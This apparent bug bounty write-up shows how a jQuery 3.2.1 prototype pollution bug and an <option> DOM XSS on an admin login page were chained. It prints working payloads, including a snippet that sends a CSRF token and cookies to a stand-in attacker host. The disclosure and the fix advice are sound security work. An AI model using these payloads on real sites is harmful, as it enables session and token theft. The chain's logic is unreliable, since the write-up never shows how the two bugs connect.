---
title: "Chaining a jQuery Prototype Pollution Bug with DOM XSS to Steal CSRF Tokens"
description: "How a legacy jQuery 3.2.1 dependency led to a CVSS 9.3 vulnerability chain: CVE-2019-11358 prototype pollution combined with a DOM-based XSS quirk in <option> parsing, chained to exfiltrate CSRF tokens and session cookies from an admin login page."
date: 2026-07-14
lang: en
draft: false
tags: ["bounty", "xss", "prototype-pollution"]
---

Old dependencies rarely die quietly, they just wait for someone to check the version string. This is a walkthrough of a bug bounty submission where a five-year-old jQuery vulnerability turned out to still be live in production, and how it chained with a second, less obvious DOM XSS quirk into a full CSRF-token-and-cookie exfiltration.

## Summary

The admin login page of a target application (submitted via [IssueHunt](https://issuehunt.io/reports/00b123a0-fb62-42aa-84d0-50a15d85b0f9), you can't see it though) loaded **jQuery 3.2.1** directly from the Google CDN. That version is affected by two separate issues:

1. **CVE-2019-11358**, Prototype Pollution in `$.extend(true, ...)`.
2. An unpatched **DOM-based XSS** via malformed `<option>` element parsing.

The finding was scored **CVSS 9.3 (Critical)**.

## Step 1: Fingerprinting the jQuery version

The first thing worth checking on any target that loads jQuery from a CDN is the exact version:

```js
$.fn.jquery
// "3.2.1"
```

jQuery 3.2.1 predates the 3.5.0 security patch, which immediately makes CVE-2019-11358 worth testing.

## Step 2: Prototype Pollution (CVE-2019-11358)

jQuery's `$.extend(true, ...)` performs a deep merge but does not filter out the `__proto__` key. That means a crafted object can inject properties directly onto `Object.prototype`, and every object created afterward inherits them:

```js
$.extend(true, {}, JSON.parse('{"__proto__":{"pwned":true,"role":"admin"}}'));

console.log({}.pwned); // true
console.log({}.role); // "admin"
```

On its own, this is a logic-corruption primitive, dangerous if the application relies on property checks without `hasOwnProperty()`, but not yet an execution primitive.

## Step 3: DOM XSS via `<option>` parsing

jQuery 3.2.1 also fails to properly sanitize HTML strings containing `<option>` elements when passed to DOM manipulation methods (`$()`, `.append()`, `.html()`). Browsers normalize the markup and hoist child elements outside the `<option>` tag, which lets injected event handlers fire:

```js
$("<option><img src=x onerror=alert(document.domain)></option>").appendTo("body");
// alert fires with the current domain
```

This specific parsing bug was patched in jQuery 3.5.0.

## Step 4: Chaining both into token exfiltration

Individually, prototype pollution and a DOM XSS quirk are two separate low-to-medium findings. Combined on an unauthenticated admin login page, they become a full token theft primitive:

```js
var token = document.querySelector('input[name=_token]').value;
var cookie = document.cookie;

new Image().src = "https://attacker-controlled.example/steal"
+ "?domain=" + document.domain
+ "&token=" + encodeURIComponent(token)
+ "&cookie=" + encodeURIComponent(cookie);
```

The exfiltrated request arrived on the listener with the target's CSRF token and `XSRF-TOKEN` session cookie attached, both values are omitted here since this was a live target's session data, but the request was confirmed received with the expected parameters populated.

## Impact

- No authentication required, the vulnerable page was the login page itself.
- Full CSRF token and session cookie exfiltration.
- Depending on session handling, this is enough to attempt session riding or further attacks against the admin panel.

## Fix

Upgrade jQuery from 3.2.1 to **3.5.0 or later**, both CVE-2019-11358 and the `<option>` DOM XSS were patched in that release. As a general rule, any CDN-loaded library deserves a version check before anything else.

## Takeaway

Neither vulnerability here was novel research, both are documented, patched issues. The finding was in noticing that a still-affected version was actually deployed, and in recognizing that two "minor" issues on the same unauthenticated page combine into something with real impact. That combination is usually more valuable to look for than chasing a single novel bug class.
